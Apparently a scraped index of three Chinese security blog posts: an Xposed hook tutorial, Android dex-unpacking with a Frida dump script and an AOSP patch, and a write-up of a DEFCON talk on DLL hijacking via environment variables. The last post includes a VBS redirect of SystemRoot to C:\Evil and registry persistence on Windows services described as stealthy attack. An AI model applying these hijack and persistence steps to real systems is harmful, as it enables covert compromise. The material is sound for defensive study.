Lsposed"],"content":"模块编写 修改AndroidManifest.xml文件 \u003cmeta-data android:name=\"xposedmodule\" android:value=\"true\" /\u003e \u003cmeta-data android:name=\"xposeddescription\" android:value=\"这是一个xposed demo\" /\u003e \u003cmeta-data android:name=\"xposedminversion\" android:value=\"82\" /\u003e 将XposedBridgeApi.jar放到项目中的app/libs目录下 XposedBridgeApi-82.jar 配置build.gradle compileOnly files('libs/XposedBridgeApi-82.jar') compileOnly 'de.robv.android.xposed:api:82' compileOnly 'de.robv.android.xposed:api:82:sources' 配置settings.gradle,在repositories中添加下面两个任意一个即可 maven { url 'https://maven.aliyun.com/repository/public/' } //maven { url \"https://api.xposed.info/\" } 新建一个类继承IXposedHookLoadPackage来写Hook代码 package com.example.luoxposeddemo; import de.robv.android.xposed.IXposedHookLoadPackage; import de.robv.android.xposed.XC_MethodHook; import de.robv.android.xposed.XposedHelpers; import de.robv.android.xposed.callbacks.XC_LoadPackage; public class LuoHook implements IXposedHookLoadPackage { private final String TAG = \"[LuoXposed]\"; @Override public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) throws Throwable { if (lpparam.packageName.equals(\"com.example.luodst\")){ Class clazz = lpparam.classLoader.loadClass(\"com.example.luodst.MainActivity\"); XposedHelpers.findAndHookMethod(clazz, \"toastMessage\", new XC_MethodHook() { @Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable { super.beforeHookedMethod(param); } @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable { param.setResult(\"你已被劫持\"); } }); } } } 在项目的main目录下新建一个assets文件夹 在上面新建的assets文件夹下,新建一个xposed_init文件,来指明Hook的入口类. 在Lsposed中启用上述编写的模块,后台杀掉测试进程App后重新启动,编写的的Hook代码就可以对上述测试Apk生效. ","date":"2022-10-25","objectID":"/posts/android/android-hook/lsposed/xposed%E5%92%8Clsposed%E5%AE%89%E8%A3%85/:4:2","tags":["Lsposed"],"title":"Xposed和Lsposed安装","uri":"/posts/android/android-hook/lsposed/xposed%E5%92%8Clsposed%E5%AE%89%E8%A3%85/"},{"categories":["Android Lsposed"],"content":"参考链接 新手不要再被误导！这是一篇最新的Xposed模块编写教程 android studio2021.3.1 最新xposed模块编写指南 ","date":"2022-10-25","objectID":"/posts/android/android-hook/lsposed/xposed%E5%92%8Clsposed%E5%AE%89%E8%A3%85/:5:0","tags":["Lsposed"],"title":"Xposed和Lsposed安装","uri":"/posts/android/android-hook/lsposed/xposed%E5%92%8Clsposed%E5%AE%89%E8%A3%85/"},{"categories":["Android壳世界"],"content":"概述 Android App脱壳的本质就是对内存中处于解密状态的dex文件的dump,不管是函数抽取壳、dex2c或者vmp,首先要做的是对整体dex的dump,然后对脱下来的dex文件进行修复. ","date":"2022-08-30","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android%E8%84%B1%E5%A3%B3%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/:1:0","tags":["Android"],"title":"Android脱壳核心原理","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android%E8%84%B1%E5%A3%B3%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/"},{"categories":["Android壳世界"],"content":"快速定位脱壳点 ","date":"2022-08-30","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android%E8%84%B1%E5%A3%B3%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/:2:0","tags":["Android"],"title":"Android脱壳核心原理","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android%E8%84%B1%E5%A3%B3%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/"},{"categories":["Android壳世界"],"content":"直接查找法 以DexFile为关键字,在Android源码中进行搜索.凡函数参数中出现DexFile类型的、函数流程中出现DexFile类型的以及函数返回值为DexFile类型的源码位置皆为脱壳点.因为在ART下DexFile类的相关定义如下: //http://androidxref.com/8.1.0_r33/xref/art/runtime/dex_file.h class DexFile{ //--- const uint8_t* Begin() const { return begin_; } size_t Size() const { return size_; } // The base address of the memory mapping. const uint8_t* const begin_; // The size of the underlying memory allocation in bytes. const size_t size_; //--- } 从上面可以看到有两个关键的变量:begin_、size_以及用于获取这两个变量的Begin()和Size()函数,这两个变量分别代表着当前DexFile对象在内存中的dex文件加载的起始位置和大小,只要有了这两个值,我们就可以完成对dex文件的dump. ","date":"2022-08-30","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android%E8%84%B1%E5%A3%B3%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/:2:1","tags":["Android"],"title":"Android脱壳核心原理","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android%E8%84%B1%E5%A3%B3%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/"},{"categories":["Android壳世界"],"content":"间接查找法 以DexFile为出发点,寻找能够间接获取到DexFile对象的.如下: 通过ArtMethod对象的**getDexFile()**函数获取到DexFile对象, 通过ShadowFrame对象的**GetMethod()**函数拿到ArtMethod指针,进而获取到DexFile对象. 通过Thread对象的**getCurrentMethod()**函数拿到ArtMethod指针,进而获取到DexFile对象. 在ART下ArtMethod类中的getDexFile函数定义如下: //http://androidxref.com/8.1.0_r33/xref/art/runtime/art_method.h //http://androidxref.com/8.1.0_r33/xref/art/runtime/art_method-inl.h inline const DexFile* ArtMethod::GetDexFile() { // It is safe to avoid the read barrier here since the dex file is constant, so if we read the // from-space dex file pointer it will be equal to the to-space copy. return GetDexCache\u003ckWithoutReadBarrier\u003e()-\u003eGetDexFile(); } 从上面可以看到这个函数是个内联函数,但是我们可以修改Android源码,在art_method.cc中添加一个导出函数LuoGetDexFile,最后可以在libart.so中找到我们的导出函数. extern \"C\" const DexFile* LuoGetDexFile(ArtMethod* m) REQUIRES_SHARED(Locks::mutator_lock_){ // It is safe to avoid the read barrier here since the dex file is constant, so if we read the // from-space dex file pointer it will be equal to the to-space copy. return m-\u003eGetDexCache\u003ckWithoutReadBarrier\u003e()-\u003eGetDexFile(); } 当然我们也可以将源码中与ArtMethod::GetDexFile()函数相关的代码移植到我们新建的工程中,编译生成自己的so文件,最后用Frida加载我们的so,调用其中的导出函数. 直接看Android源码,不太好明白ArtMethod::GetDexFile()这个函数到底做了什么,我们可以先修改Android源码,将GetDexFile函数导出,用IDA查看结果如下: 另外值得一提的是ArtMethod::GetObsoleteDexCache()这个函数在libart.so中是导出的,至此我们明白了ArtMethod::GetDexFile()这个函数的内部机制,可以编译生成自己的so文件了. ","date":"2022-08-30","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android%E8%84%B1%E5%A3%B3%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/:2:2","tags":["Android"],"title":"Android脱壳核心原理","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android%E8%84%B1%E5%A3%B3%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/"},{"categories":["Android壳世界"],"content":"ART下寻找脱壳点 不管Android版本如何变化,我们可以从以下4个方面来定位脱壳点. ","date":"2022-08-30","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android%E8%84%B1%E5%A3%B3%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/:3:0","tags":["Android"],"title":"Android脱壳核心原理","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android%E8%84%B1%E5%A3%B3%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/"},{"categories":["Android壳世界"],"content":"dex的加载流程 //http://androidxref.com/8.1.0_r33/xref/libcore/dalvik/src/main/java/dalvik/system/DexClassLoader.java public DexClassLoader(String dexPath, String optimizedDirectory, String librarySearchPath, ClassLoader parent) //http://androidxref.com/8.1.0_r33/xref/libcore/dalvik/src/main/java/dalvik/system/BaseDexClassLoader.java -\u003epublic BaseDexClassLoader(String dexPath, File optimizedDirectory, String librarySearchPath, ClassLoader parent) //http://androidxref.com/8.1.0_r33/xref/libcore/dalvik/src/main/java/dalvik/system/DexPathList.java public DexPathList(ClassLoader definingContext, String dexPath, String librarySearchPath, File optimizedDirectory) -\u003eprivate static Element[] makeDexElements(List\u003cFile\u003e files, File optimizedDirectory, List\u003cIOException\u003e suppressedExceptions, ClassLoader loader) //http://androidxref.com/8.1.0_r33/xref/libcore/dalvik/src/main/java/dalvik/system/DexFile.java -\u003eprivate static DexFile loadDexFile(File file, File optimizedDirectory, ClassLoader loader, Element[] elements) -\u003estatic DexFile loadDex(String sourcePathName, String outputPathName, int flags, ClassLoader loader, DexPathList.Element[] elements) -\u003eprivate DexFile(String sourceName, String outputName, int flags, ClassLoader loader, DexPathList.Element[] elements) -\u003eprivate static Object openDexFile(String sourceName, String outputName, int flags, ClassLoader loader, DexPathList.Element[] elements) -\u003e private static native Object openDexFileNative(String sourceName, String outputName, int flags, ClassLoader loader, DexPathList.Element[] elements) http://androidxref.com/8.1.0_r33/xref/art/runtime/native/dalvik_system_DexFile.cc -\u003estatic jobject DexFile_openDexFileNative(JNIEnv* env, jclass, jstring javaSourceName, jstring javaOutputName ATTRIBUTE_UNUSED, jint flags ATTRIBUTE_UNUSED, jobject class_loader, jobjectArray dex_elements) //http://androidxref.com/8.1.0_r33/xref/art/runtime/oat_file_manager.cc -\u003estd::vector\u003cstd::unique_ptr\u003cconst DexFile\u003e\u003e OatFileManager::OpenDexFilesFromOat( const char* dex_location, jobject class_loader, jobjectArray dex_elements, const OatFile** out_oat_file, std::vector\u003cstd::string\u003e* error_msgs) //这个分支会调用dex2oat流程 -\u003eOatFileAssistant::MakeUpToDate(bool profile_changed, ClassLoaderContext* class_loader_context, std::string* error_msg) -\u003eOatFileAssistant::ResultOfAttemptToUpdate OatFileAssistant::GenerateOatFileNoChecks( OatFileAssistant::OatFileInfo\u0026 info, CompilerFilter::Filter filter, const ClassLoaderContext* class_loader_context, std::string* error_msg) -\u003ebool OatFileAssistant::Dex2Oat(const std::vector\u003cstd::string\u003e\u0026 args, std::string* error_msg) //http://androidxref.com/8.1.0_r33/xref/art/runtime/exec_utils.cc -\u003ebool Exec(std::vector\u003cstd::string\u003e\u0026 arg_vector, std::string* error_msg) -\u003eint ExecAndReturnCode(std::vector\u003cstd::string\u003e\u0026 arg_vector, std::string* error_msg) //http://androidxref.com/8.1.0_r33/xref/art/runtime/oat_file_manager.cc //依然从上面的OatFileManager::OpenDexFilesFromOat开始看起 //如果dex2oat流程失败,走下面的分支 //http://androidxref.com/8.1.0_r33/xref/art/runtime/dex_file.cc -\u003ebool DexFile::Open(const char* filename, const std::string\u0026 location, bool verify_checksum, std::string* error_msg, std::vector\u003cstd::unique_ptr\u003cconst DexFile\u003e\u003e* dex_files) //http://androidxref.com/8.1.0_r33/xref/art/runtime/base/file_magic.cc -\u003eFile OpenAndReadMagic(const char* filename, uint32_t* magic, std::string* error_msg) //http://androidxref.com/8.1.0_r33/xref/art/runtime/dex_file.cc -\u003estd::unique_ptr\u003cconst DexFile\u003e DexFile::OpenFile(int fd, const std::string\u0026 location, bool verify, bool verify_checksum, std::string* error_msg) -\u003estd::unique_ptr\u003cDexFile\u003e DexFile::OpenCommon(const uint8_t* base, size_t size, const std::string\u0026 location, uint32_t location_checksum, const OatDexFile* oat_dex_file, bool verify, bool verify_checksum, std::string* error_msg, VerifyResult* verify_result) -\u003eDexFile::DexFile(const uint8_t* base, size_t size, const std::string\u0026 location, uint32_t location_checksum, const OatDexFile* oat_dex_file) //http://aospxref.c","date":"2022-08-30","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android%E8%84%B1%E5%A3%B3%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/:3:1","tags":["Android"],"title":"Android脱壳核心原理","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android%E8%84%B1%E5%A3%B3%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/"},{"categories":["Android壳世界"],"content":"dex2oat的编译流程 一般对于抽取壳来说,都会阻断dex2oat过程,如果不干掉这个过程,系统就会对dex文件进行编译生成oat文件,那么壳动态修改dex文件中的smali指令就不会生效! 换句话说,如何壳没有干掉dex2oat过程,那我们在这个过程中dump下来的dex必是完整的,里面的函数指令必不会被抽取. //http://androidxref.com/8.1.0_r33/xref/art/dex2oat/dex2oat.cc int main(int argc, char** argv) -\u003estatic dex2oat::ReturnCode Dex2oat(int argc, char** argv) -\u003edex2oat::ReturnCode Setup() -\u003estatic dex2oat::ReturnCode CompileApp(Dex2Oat\u0026 dex2oat) -\u003ejobject Compile() //http://androidxref.com/8.1.0_r33/xref/art/compiler/driver/compiler_driver.cc -\u003estatic void CompileMethod(Thread* self, CompilerDriver* driver, const DexFile::CodeItem* code_item, uint32_t access_flags, InvokeType invoke_type, uint16_t class_def_idx, uint32_t method_idx, Handle\u003cmirror::ClassLoader\u003e class_loader, const DexFile\u0026 dex_file, optimizer::DexToDexCompilationLevel dex_to_dex_compilation_level, bool compilation_enabled, Handle\u003cmirror::DexCache\u003e dex_cache) -\u003e... ","date":"2022-08-30","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android%E8%84%B1%E5%A3%B3%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/:3:2","tags":["Android"],"title":"Android脱壳核心原理","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android%E8%84%B1%E5%A3%B3%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/"},{"categories":["Android壳世界"],"content":"类的加载和初始化流程 //http://androidxref.com/8.1.0_r33/xref/art/runtime/class_linker.cc void ClassLinker::LoadClass(Thread* self, const DexFile\u0026 dex_file, const DexFile::ClassDef\u0026 dex_class_def, Handle\u003cmirror::Class\u003e klass) -\u003evoid ClassLinker::LoadClassMembers(Thread* self, const DexFile\u0026 dex_file, const uint8_t* class_data, Handle\u003cmirror::Class\u003e klass) -\u003evoid ClassLinker::LoadMethod(const DexFile\u0026 dex_file, const ClassDataItemIterator\u0026 it, Handle\u003cmirror::Class\u003e klass, ArtMethod* dst) -\u003e... ","date":"2022-08-30","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android%E8%84%B1%E5%A3%B3%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/:3:3","tags":["Android"],"title":"Android脱壳核心原理","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android%E8%84%B1%E5%A3%B3%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/"},{"categories":["Android壳世界"],"content":"函数执行过程中出现的脱壳点 Java函数有两种执行模式,一种是解释模式,另一种是经过dex2oat编译后在quick模式执行. 对于所有在解释模式下执行的函数都会经过interpreter.cc中的Execute函数. //http://androidxref.com/8.1.0_r33/xref/art/runtime/interpreter/interpreter.cc static inline JValue Execute( Thread* self, const DexFile::CodeItem* code_item, ShadowFrame\u0026 shadow_frame, JValue result_register, bool stay_in_interpreter = false) -\u003e... Art下每一个Java函数,在加载完都会有一个ArtMethod对象与其一一对应,在函数执行过程中通常都会调用Invoke函数. //http://androidxref.com/8.1.0_r33/xref/art/runtime/art_method.cc void ArtMethod::Invoke(Thread* self, uint32_t* args, uint32_t args_size, JValue* result, const char* shorty) -\u003e... ","date":"2022-08-30","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android%E8%84%B1%E5%A3%B3%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/:3:4","tags":["Android"],"title":"Android脱壳核心原理","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android%E8%84%B1%E5%A3%B3%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/"},{"categories":["Android壳世界"],"content":"示例 ","date":"2022-08-30","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android%E8%84%B1%E5%A3%B3%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/:4:0","tags":["Android"],"title":"Android脱壳核心原理","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android%E8%84%B1%E5%A3%B3%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/"},{"categories":["Android壳世界"],"content":"Hook代码 下面展示下用Frida Hook上述类加载过程中的LoadMethod函数来完成dex的dump. var map_Dex = {}; var addrGetDexFile = null; var funcGetDexFile = null; var addrGetObsoleteDexCache = null; var savepath = \"/sdcard\"; function dump_Dex(begin, size) { var file_path = savepath + \"/\" + size + \".dex\" var dexfile_handle = new File(file_path, \"w\") dexfile_handle.write(ptr(begin).readByteArray(size)); dexfile_handle.flush(); dexfile_handle.close(); console.log(\"dump: \" + file_path) } function init() { var module_libext = null; if (Process.arch === \"arm64\") { module_libext = Module.load(\"/data/app/fart64.so\"); } else if (Process.arch === \"arm\") { module_libext = Module.load(\"/data/app/fart.so\"); } if (module_libext != null) { addrGetDexFile = module_libext.findExportByName(\"GetDexFile\"); funcGetDexFile = new NativeFunction(addrGetDexFile, \"pointer\", [\"pointer\", \"pointer\"]); } } function find_Method() { var symbols = Module.enumerateSymbols(\"libart.so\") var addrLoadMethod = null; for (var i = 0; i \u003c symbols.length; i++) { var symbol = symbols[i] if (symbol.name.indexOf(\"ArtMethod\") \u003e= 0 \u0026\u0026 symbol.name.indexOf(\"GetObsoleteDexCache\") \u003e= 0) { addrGetObsoleteDexCache = symbol.address } if (symbol.name.indexOf(\"LoadMethod\") \u003e 0 \u0026\u0026 symbol.name.indexOf(\"CheckLoadMethod\") \u003c 0) { addrLoadMethod = symbol.address //console.log(\"LoadMethod is at \", symbol.address, symbol.name); hook_LoadMethod(addrLoadMethod) } } } function hook_LoadMethod(addrLoadMethod) { if (addrLoadMethod == null) { console.log(\"addrLoadMethod == null\") return } //http://androidxref.com/8.1.0_r33/xref/art/runtime/class_linker.cc // void ClassLinker::LoadMethod(const DexFile\u0026 dex_file, // const ClassDataItemIterator\u0026 it, // Handle\u003cmirror::Class\u003e klass, // ArtMethod* dst) Interceptor.attach(addrLoadMethod, { onEnter: function (args) { //var ptr_Dexfile = args[1] this.dst = ptr(args[4]) }, onLeave(ret){ //执行完LoadMethod函数后,ClassLinker::LoadMethod参数中的dst才会被填充 var ptr_Dexfile = funcGetDexFile(this.dst, addrGetObsoleteDexCache) var beg = ptr(ptr_Dexfile).add(Process.pointerSize).readPointer() var size = ptr(ptr_Dexfile).add(Process.pointerSize * 2).readU32() if (map_Dex[size] == undefined) { map_Dex[size] = beg //console.log(hexdump(beg, {length:16})) dump_Dex(beg, size) } } }) } function main() { init() find_Method() } setImmediate(main) ","date":"2022-08-30","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android%E8%84%B1%E5%A3%B3%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/:4:1","tags":["Android"],"title":"Android脱壳核心原理","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android%E8%84%B1%E5%A3%B3%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/"},{"categories":["Android壳世界"],"content":"修改Android源码 下面展示下通过修改函数执行过程中的Execute函数来完成dex的dump. //add #include \u003cstring\u003e #include \u003csys/types.h\u003e #include \u003csys/stat.h\u003e #include \u003cunistd.h\u003e #include \u003cfcntl.h\u003e std::string getFileContent(char* fileName){ char buf[0x100]={}; memset(buf, 0, sizeof(buf)); FILE* fp = fopen(fileName, \"r\"); if (fp){ if (fgets(buf, sizeof(buf), fp)){} fclose(fp); } return std::string(buf); } bool shouldUnpack(){ char selfCmdline[] = \"/proc/self/cmdline\"; std::string strSelfPackage = getFileContent(selfCmdline); char configFile[] = \"/data/local/tmp/LuoHun.config\"; std::string strDstPackage = getFileContent(configFile); if (strSelfPackage.compare(strDstPackage) == 0){ return true; } else{ return false; } } //add static inline JValue Execute( Thread* self, const DexFile::CodeItem* code_item, ShadowFrame\u0026 shadow_frame, JValue result_register, bool stay_in_interpreter = false) REQUIRES_SHARED(Locks::mutator_lock_) { //--------------------------------------- ArtMethod *method = shadow_frame.GetMethod(); //add if(shouldUnpack()){ const art::DexFile* pDexFile = method-\u003eGetDexFile(); char szFuncName[] = \"Execute\"; char dexFilePath[100] = {}; memset(dexFilePath, 0, sizeof(dexFilePath)); sprintf(dexFilePath, \"/sdcard/%d_%zu_%s.dex\", getpid(), pDexFile-\u003eSize(), szFuncName); int dexFd = open(dexFilePath, O_CREAT | O_RDWR , 0666); if (dexFd \u003e 0){ int nResult = write(dexFd, pDexFile-\u003eBegin(), pDexFile-\u003eSize()); if (nResult \u003e 0){ close(dexFd); LOG(WARNING) \u003c\u003c szFuncName \u003c\u003c dexFilePath; } } } //add //--------------------------------------- } ","date":"2022-08-30","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android%E8%84%B1%E5%A3%B3%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/:4:2","tags":["Android"],"title":"Android脱壳核心原理","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android%E8%84%B1%E5%A3%B3%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/"},{"categories":["Android壳世界"],"content":"参考链接 拨云见日：安卓APP脱壳的本质以及如何快速发现ART下的脱壳点 ","date":"2022-08-30","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android%E8%84%B1%E5%A3%B3%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/:5:0","tags":["Android"],"title":"Android脱壳核心原理","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android%E8%84%B1%E5%A3%B3%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/"},{"categories":["Win相关"],"content":"简介 在2022年的Defcon大会上,安全研究人员Wietze Beukema通过对进程级环境变量的研究,提出了一种Dll劫持新思路,下面就其中涉及的技术点展开介绍. ","date":"2022-08-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/dll%E5%8A%AB%E6%8C%81%E6%96%B0%E6%80%9D%E8%B7%AF-%E4%BF%AE%E6%94%B9%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/:1:0","tags":["Windows"],"title":"DEFCON议题解读｜Dll劫持新思路——修改环境变量","uri":"/posts/windows%E7%9B%B8%E5%85%B3/dll%E5%8A%AB%E6%8C%81%E6%96%B0%E6%80%9D%E8%B7%AF-%E4%BF%AE%E6%94%B9%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/"},{"categories":["Win相关"],"content":"环境变量 每一个进程都有一个环境块,其中包含一组环境变量及其值.有两种类型的环境变量,用户环境变量和系统环境变量. 用户环境变量:仅对当前用户有效,位于:HKEY_CURRENT_USER\\Environment 系统环境变量:对所有用户均有效,位于:HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Session Manager\\Environment 默认情况下,子进程继承其父进程的环境变量.命令处理器启动的程序继承命令处理器的环境变量. ","date":"2022-08-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/dll%E5%8A%AB%E6%8C%81%E6%96%B0%E6%80%9D%E8%B7%AF-%E4%BF%AE%E6%94%B9%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/:2:0","tags":["Windows"],"title":"DEFCON议题解读｜Dll劫持新思路——修改环境变量","uri":"/posts/windows%E7%9B%B8%E5%85%B3/dll%E5%8A%AB%E6%8C%81%E6%96%B0%E6%80%9D%E8%B7%AF-%E4%BF%AE%E6%94%B9%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/"},{"categories":["Win相关"],"content":"劫持原因 程序可能会依赖Windows定义好的环境变量来确定某些文件的位置,尤其对于Windows内置程序来说大量依赖环境变量来寻找系统盘文件.如下展示的是Windows系统盘ws2_32.dll中的代码片段: 正常来说\"%SystemRoot%/System32/mswsock.dll\"会被解析为\"C:/Windows/System32/mswsock.dll\",但是这里面有一个不确定的因素就是\"%SystemRoot%\",假设我们修改了环境变量\"%SystemRoot%“的值为其他文件夹路径且在该路径下存放恶意Dll,那么程序就会加载我们设定的Dll,继而完成Dll劫持. 如果直接更改”%SystemRoot%“的值,会对整个操作系统上运行的程序产生影响,但是我们可以只修改指定进程的环境变量,如创建以下vbs脚本,利用子进程默认继承其父进程环境变量的特性,修改Windows内置进程hostname.exe的环境变量\"SystemRoot\"为\"C:\\Evil”. Set shell = WScript.CreateObject(\"WScript.Shell\") shell.Environment(\"Process\")(\"SystemRoot\") = \"C:\\Evil\" shell.Exec(\"C:\\windows\\system32\\hostname.exe\") 操作流程如下: 然后用Procmon监控hostname.exe,可以看到确实会加载\"C:\\Evil\"路径下的Dll. ","date":"2022-08-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/dll%E5%8A%AB%E6%8C%81%E6%96%B0%E6%80%9D%E8%B7%AF-%E4%BF%AE%E6%94%B9%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/:3:0","tags":["Windows"],"title":"DEFCON议题解读｜Dll劫持新思路——修改环境变量","uri":"/posts/windows%E7%9B%B8%E5%85%B3/dll%E5%8A%AB%E6%8C%81%E6%96%B0%E6%80%9D%E8%B7%AF-%E4%BF%AE%E6%94%B9%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/"},{"categories":["Win相关"],"content":"持久化 从上面流程可以看到,能够完成Dll劫持的关键在于修改环境变量的值,那么完成持久化的关键就在于维持目标进程环境变量值的修改.下面提供2种持久化方案. ","date":"2022-08-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/dll%E5%8A%AB%E6%8C%81%E6%96%B0%E6%80%9D%E8%B7%AF-%E4%BF%AE%E6%94%B9%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/:4:0","tags":["Windows"],"title":"DEFCON议题解读｜Dll劫持新思路——修改环境变量","uri":"/posts/windows%E7%9B%B8%E5%85%B3/dll%E5%8A%AB%E6%8C%81%E6%96%B0%E6%80%9D%E8%B7%AF-%E4%BF%AE%E6%94%B9%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/"},{"categories":["Win相关"],"content":"利用注册表修改Windows自启服务环境变量 这里先引用下Wietze Beukema文章中提到的修改Windows打印机服务的环境变量,看是否会成功加载指定目录下的Dll文件. 首先将恶意Dll\"mswsock.dll\"放到指定目录\"C:\\Evil\\System32\". 在注册表spoolsv服务下创建\"Environment\"键值修改环境变量. 重启spoolsv服务,用Procmon进行监控. 可以看到使用上述方式修改Windows服务的环境变量确实能够加载我们指定目录下的Dll文件. 注意 有时候为了保证被修改的服务能够正常运行,我们需要将受环境变量影响的Dll全部移动到我们指定的路径下. 实际上能够被利用的Windows服务远不止上面一个,通常来说服务对应一个PE文件,这里我们去看看Windows自带服务的PE文件路径是如何写的就明白了. 可以看到很多服务都依赖环境变量来寻找所对应的PE文件,这里我推荐修改的Windows自启服务是Windows推送通知系统服务(WpnService),修改环境变量后只需移动一个受影响的Dll文件即可,不用管该服务是否能够正常运行. ","date":"2022-08-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/dll%E5%8A%AB%E6%8C%81%E6%96%B0%E6%80%9D%E8%B7%AF-%E4%BF%AE%E6%94%B9%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/:4:1","tags":["Windows"],"title":"DEFCON议题解读｜Dll劫持新思路——修改环境变量","uri":"/posts/windows%E7%9B%B8%E5%85%B3/dll%E5%8A%AB%E6%8C%81%E6%96%B0%E6%80%9D%E8%B7%AF-%E4%BF%AE%E6%94%B9%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/"},{"categories":["Win相关"],"content":"常规持久化配合创建子进程 我们也可以使用常规持久化方案如创建计划任务或者写注册表来实现自启,然后程序自启后自修改自身环境变量值,最后创建受环境变量影响的Windows可信进程,利用Dll劫持来完成一次隐匿攻击行为. 接下来使用Win32 API来展示下如何修改子进程的环境变量. 子进程Child.exe代码如下: #include \u003cwindows.h\u003e int main(int argc, char* argv[], char* envp[]) { char szBuf[MAX_PATH] = {}; GetEnvironmentVariable(\"SystemRoot\", szBuf, sizeof(szBuf)); MessageBox(NULL, szBuf, \"Child\", MB_OK); return 0; } 父进程Parent.exe代码如下: #include \u003cstdio.h\u003e #include \u003cwindows.h\u003e int main(int argc, char* argv[], char* envp[]) { SetEnvironmentVariable(\"SystemRoot\", \"C:\\\\Evil\"); UINT nRet = WinExec(\"C:/Users/Super/Desktop/Child.exe\", SW_HIDE); if (nRet \u003e 31) { printf(\"创建子进程成功\\n\"); } else { printf(\"创建子进程失败\\n\"); } return 0; } 运行Parent.exe进程,查看结果. 以上需要注意一点的就是,当Child.exe进程需要的权限比Parent.exe进程高时,Parent.exe创建Child.exe进程时会失败,当然也就无法谈起修改其环境变量值了,如下: ","date":"2022-08-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/dll%E5%8A%AB%E6%8C%81%E6%96%B0%E6%80%9D%E8%B7%AF-%E4%BF%AE%E6%94%B9%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/:4:2","tags":["Windows"],"title":"DEFCON议题解读｜Dll劫持新思路——修改环境变量","uri":"/posts/windows%E7%9B%B8%E5%85%B3/dll%E5%8A%AB%E6%8C%81%E6%96%B0%E6%80%9D%E8%B7%AF-%E4%BF%AE%E6%94%B9%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/"},{"categories":["Win相关"],"content":"预防和影响范围 环境变量是Windows的一个历史包袱,随着Windows注册表出现,可以在一定程度上代替环境变量.但是为了考虑兼容性,它依然存在且在Windows内部大量使用.关于这点,我们可以对程序进行简单的调试,对ExpandEnvironmentStringsW 